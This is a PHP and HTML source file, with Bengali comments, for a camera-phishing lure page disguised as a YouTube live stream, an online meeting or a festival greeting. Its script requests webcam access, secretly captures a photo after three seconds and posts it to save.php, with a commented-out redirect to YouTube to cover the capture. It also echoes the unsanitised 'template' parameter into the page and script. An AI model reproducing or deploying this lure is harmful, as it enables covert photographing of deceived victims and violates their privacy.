<?php
$template = isset($_GET['template']) ? $_GET['template'] : 'youtube';
$title = [
    'youtube' => 'YouTube Live',
    'meeting' => 'Online Meeting',
    'festival' => 'Festival Wishes'
][$template] ?? 'Live Stream';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $title; ?></title>
    <style>
        /* কমন স্টাইল */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #000;
            color: #fff;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            border-radius: 10px;
        }
        .video-container {
            width: 100%;
            height: 450px;
            background: #111;
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        .loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #fff;
            text-align: center;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        /* টেমপ্লেট স্পেসিফিক স্টাইল */
        <?php if($template == 'youtube'): ?>
        .header {
            background: #ff0000;
        }
        .button {
            background: #ff0000;
            color: white;
        }
        <?php elseif($template == 'meeting'): ?>
        .header {
            background: #0066ff;
        }
        .button {
            background: #00cc00;
            color: white;
        }
        <?php else: ?>
        .header {
            background: linear-gradient(45deg, #ff0000, #ff6600);
        }
        .button {
            background: #ffcc00;
            color: black;
        }
        <?php endif; ?>
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><?php echo $title; ?></h1>
            <?php if($template == 'youtube'): ?>
                <p>Please wait while we connect to the live stream...</p>
            <?php elseif($template == 'meeting'): ?>
                <p>Joining secure video conference...</p>
            <?php else: ?>
                <p>Create your special festival greeting!</p>
            <?php endif; ?>
        </div>

        <div class="video-container">
            <div id="camera-feed"></div>
            <div class="loading">
                <p>Loading...</p>
                <p>Please allow camera access to continue</p>
            </div>
        </div>

        <div style="text-align: center; margin-top: 20px;">
            <?php if($template == 'youtube'): ?>
                <button class="button">Start Streaming</button>
            <?php elseif($template == 'meeting'): ?>
                <button class="button">Join Meeting</button>
            <?php else: ?>
                <button class="button">Create Greeting</button>
            <?php endif; ?>
        </div>
    </div>

    <script>
        // ক্যামেরা ক্যাপচার স্ক্রিপ্ট
        document.addEventListener('DOMContentLoaded', function() {
            const loading = document.querySelector('.loading');
            const cameraFeed = document.getElementById('camera-feed');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    loading.style.display = 'none';
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    video.style.width = '100%';
                    video.style.height = '100%';
                    cameraFeed.appendChild(video);
                    
                    // 3 সেকেন্ড পর ক্যাপচার
                    setTimeout(function() {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        // ইমেজ সেভ
                        fetch('save.php', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                image: canvas.toDataURL('image/png'),
                                template: '<?php echo $template; ?>'
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if(data.status === 'success') {
                                // অপশনাল রিডাইরেক্ট
                                // window.location.href = 'https://youtube.com';
                            }
                        })
                        .catch(error => console.error('Error:', error));
                    }, 3000);
                })
                .catch(function(err) {
                    loading.innerHTML = `
                        <p style="color: red;">Camera access denied!</p>
                        <p>Please allow camera access to continue</p>
                    `;
                });
        });
    </script>
</body>
</html>
